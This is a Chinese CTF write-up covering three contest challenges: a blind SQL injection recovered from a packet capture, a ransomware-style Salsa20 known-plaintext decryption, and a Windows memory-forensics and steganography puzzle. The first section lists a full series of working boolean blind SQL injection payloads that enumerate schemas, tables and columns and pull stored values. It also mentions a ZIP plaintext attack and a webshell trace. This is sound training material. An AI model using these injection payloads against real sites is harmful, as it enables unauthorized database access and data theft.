# 3CTF初赛题目详解（下）

阅读量 **838364**

|评论 **1**

发布时间 : 2019-10-30 14:29:12

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t019a4519fefd71c7a2.png)

## 8：注入真的好难!!!

题目类型：Web

解题思路：

过滤HTTP请求

可以看到进行了sql盲注，采用二分法对数据库进行注入，获取数据。

判断数据库的个数，可以看见当数据返回长度为1003时结束，由此可以对下面操作进行判断，返回最小的长度为1003的输出结果。

经过分析：

1、 获取数据库个数

    
    
    /sql/Less-8/?id=1' and ((select count(schema_name) from information_schema.schemata) > {0})%23"

共有7个数据库

2、 获取数据库长度

    
    
    /sql/Less-8/?id=1' and ((select length(schema_name) from information_schema.schemata limit 0,1) > {0})%23"

第一个数据库长度18

    
    
    /sql/Less-8/?id=1' and ((select length(schema_name) from information_schema.schemata limit 1,1) > {0})%23"

第二个数据库长度6

3、 获取数据库名

    
    
    /sql/Less-8/?id=1' and ascii(substr((select concat(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1),{0},1))>{1} %23"

第一个数据库长度18，依次类推获得数据库ASCII，转化为information_schema

    
    
    /sql/Less-8/?id=1' and ascii(substr((select concat(SCHEMA_NAME) from information_schema.SCHEMATA limit 1,1),{0},1))>{1} %23"

第二个数据库长度6，依次类推获得数据库ASCII，转化为360ctf

4、 表个数

    
    
    /sql/Less-8/?id=1' and (select count(distinct+table_name) from information_schema.tables where table_schema='360ctf') >{0} %23"

共有1个表

5、 获取表长度

    
    
    /Less-8/?id=1' and (select length(table_name) from information_schema.tables where table_schema='360ctf' limit 0,1) >{0} %23"

表长度为4

6、 获取表名

    
    
    /sql/Less-8/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='360ctf' limit 0,1),{0},1))>{1} %23"

表长度为4，依次类推获得数据库ASCII，转化为flag

7、 获取字段个数

    
    
    /sql/Less-8/?id=1' and (select count(distinct+column_name) from information_schema.columns where table_schema='360ctf' and table_name='flag' ) >{0} %23"

获取字段数为2

8、获取字段长度

    
    
    /Less-8/?id=1' and (select length(column_name) from information_schema.columns where table_schema='360ctf' and table_name='flag' limit 0,1) >{0} %23"

第一个字段长为3，第二个字段长为6

8、 获取字段名

    
    
    /Less-8/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),{0},1))>{1} %23"

第一个字段ASCII，转化为url，第二个字段ASCII，转化为passwd

9、 获取行数

    
    
    /Less-8/?id=1' and ((select count(*) from 360ctf.flag ) > {0})%23"

行数为1行

10、获取内容长度

    
    
    /sql/Less-8/?id=1' and ((select length(url) from 360ctf.flag limit 0,1) > {0})%23"

第一个长度为13，第二个长度为5

11、获取内容

    
    
    /sql/Less-8/?id=1' and ascii(substr((select url from 360ctf.flag limit 0,1),{0},1))>{1} %23"

url为：t.cn/Ai8PhqSb

passwd为：bkis

访问百度云盘得到一个加密的压缩包，追踪流还发现菜刀连接的痕迹，发现存在readme.7z文件。

通过导出HTTP请求可以发现所有的sql请求以及下载的readme.7z压缩包。

保存readme.7z文件到本地，发现flag.zip里面也存在readme.txt，执行明文攻击。

使用7z对readme.txt进行压缩，是的CRC32校验值和flag.zip里面的一样。

使用ARCHPR进行明文攻击

明文没有破解出来，但是可以使用加密秘钥进行解密操作。

保存为flag_decrypted.zip，成功解密得到flag.txt

flag{1d0ea6a36f6aaf7fa5d4b007454227d6}

## 9：Alice的秘密

Alice把一个秘密藏在了她最爱读的“4书”的文件末尾，但不幸的是这个文件被勒索病毒加密了。还好她还有一份“4书”未藏秘密前的备份，不然就连“4书”都没得看了。但这个备份是未藏秘密之前做的，你能帮Alice找回她的秘密吗？（需要提供2个文件：4书.enc、4书.备份）

这是Alice的朋友帮她逆向得到的勒索病毒的加密部分代码：

    
    
    #define R(a,b) (((a) << (b)) | ((a) >> (32 - (b))))
    
    void crypt(uint32 out[16],uint32 in[16])
    
    {
    
        int i;
    
        uint32 x[16];
    
        for (i = 0;i < 16;++i)
    
            x[i] = in[i];
    
        for (i = 20;i > 0;i -= 2) {
    
            x[ 4] ^= R(x[ 0]+x[12], 7);  x[ 8] ^= R(x[ 4]+x[ 0], 9);
    
            x[12] ^= R(x[ 8]+x[ 4],13);  x[ 0] ^= R(x[12]+x[ 8],18);
    
            x[ 9] ^= R(x[ 5]+x[ 1], 7);  x[13] ^= R(x[ 9]+x[ 5], 9);
    
            x[ 1] ^= R(x[13]+x[ 9],13);  x[ 5] ^= R(x[ 1]+x[13],18);
    
            x[14] ^= R(x[10]+x[ 6], 7);  x[ 2] ^= R(x[14]+x[10], 9);
    
            x[ 6] ^= R(x[ 2]+x[14],13);  x[10] ^= R(x[ 6]+x[ 2],18);
    
            x[ 3] ^= R(x[15]+x[11], 7);  x[ 7] ^= R(x[ 3]+x[15], 9);
    
            x[11] ^= R(x[ 7]+x[ 3],13);  x[15] ^= R(x[11]+x[ 7],18);
    
            x[ 1] ^= R(x[ 0]+x[ 3], 7);  x[ 2] ^= R(x[ 1]+x[ 0], 9);
    
            x[ 3] ^= R(x[ 2]+x[ 1],13);  x[ 0] ^= R(x[ 3]+x[ 2],18);
    
            x[ 6] ^= R(x[ 5]+x[ 4], 7);  x[ 7] ^= R(x[ 6]+x[ 5], 9);
    
            x[ 4] ^= R(x[ 7]+x[ 6],13);  x[ 5] ^= R(x[ 4]+x[ 7],18);
    
            x[11] ^= R(x[10]+x[ 9], 7);  x[ 8] ^= R(x[11]+x[10], 9);
    
            x[ 9] ^= R(x[ 8]+x[11],13);  x[10] ^= R(x[ 9]+x[ 8],18);
    
            x[12] ^= R(x[15]+x[14], 7);  x[13] ^= R(x[12]+x[15], 9);
    
            x[14] ^= R(x[13]+x[12],13);  x[15] ^= R(x[14]+x[13],18);
    
        }
    
        for (i = 0;i < 16;++i)
    
            out[i] = x[i] + in[i];
    
    }

题目类型：加密破解

解题思路：

1\. 对比备份“4书”和被加密的“4书”，可以猜到加密不改变文件长度，以及秘密长度。

2\. 分析加密算法，找到算法缺陷。

3\. 发现缺陷：只要已知4MB明文，可以恢复其余密文。

4\. 设计算法解密：

5\. 解密得到全部明文。

6\. 在文件尾部找到秘密。

答案：=&360CTF{^o^yoYo_y0u_g@t_tHe_Salsa_seCrEt~!!}

## 10：google语法真不错！！！

题目类型：取证

解题思路：

volatility -f xp.raw imageinfo //识别系统

volatility -f xp.raw –profile=WinXPSP2x86 pslist //查看进程

存在cmd、ie等进程。

volatility -f xp.raw –profile=WinXPSP2x86 cmdscan //cmd历史命令

执行了6条命令，乱码应该是桌面

volatility -f xp.raw –profile=WinXPSP2x86 filescan | grep 桌面 //查看桌面

存在桌面jpg文件

volatility -f xp.raw –profile=WinXPSP2x86 dumpfiles -D ./ -Q
0x000000000215f340 //保存文件出来

保存360.jpg文件到本地

volatility -f xp.raw –profile=WinXPSP2x86 iehistory //ie历史记录

发现搜索了github以及Syst2m，进行google搜索，发现Syst2m的一个github

<https://github.com/Syst2m/360CTF>,存在一个360CTF的仓库。

通过查看commits和release发现为F5图片隐写。

F5隐写

java Extract ../360.jpg -p 360CTFisSOeasy

生成output.txt

flag{0b9c9fc7d19a072ee23cf10729338041}

如果你想展示你的CTF能力，我们提供给你机会，平台近期开始向社会征集CTF题目，题目类型不限制，奖励丰厚，有想法的大佬可以联系

university@360.cn。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360CSTCDC** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/189874](/post/id/189874)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __3赞

 __收藏

![](https://p0.ssl.qhimg.com/t01ac700c30ee44b777.png) 360CSTCDC

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

